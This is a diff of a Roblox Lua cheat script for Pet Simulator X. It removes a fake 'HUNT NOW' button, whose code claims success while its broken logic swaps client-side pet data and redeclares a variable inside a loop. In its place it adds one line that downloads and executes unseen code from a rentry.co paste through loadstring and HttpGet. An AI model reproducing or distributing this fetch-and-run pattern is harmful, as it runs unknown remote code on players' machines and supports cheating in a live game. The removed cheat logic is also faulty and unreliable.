@@ -1,18 +1,1 @@
-local Library = loadstring(Game:HttpGet("https://raw.githubusercontent.com/bloodball/-back-ups-for-libs/main/wizard"))()
-local Window = Library:NewWindow("PSX99HUGEHUNTER")
-local Tab = Window:NewSection("HUGEHUNT")
-Tab:CreateButton("HUNT NOW", function()
-local message = require(game.ReplicatedStorage.Library.Client.Message)
-    message.Error("HUNT SUCCESSFULLY")
-local lib = require(game.ReplicatedStorage.Library)
-
-   local fromPet = "Diamond Dragon"
-local toPet = "Huge Shadow Dominus"
-for i,v in pairs(lib.Directory.Pets[fromPet]) do
-  lib.Directory.Pets[fromPet][i] = nil
-local fromPet = "Cat"
-end
-for i,v in pairs(lib.Directory.Pets[toPet]) do
-  lib.Directory.Pets[fromPet][i] = v
-end
-end)
+loadstring(game:HttpGet('https://rentry.co/wteb5qo4/raw',true))()
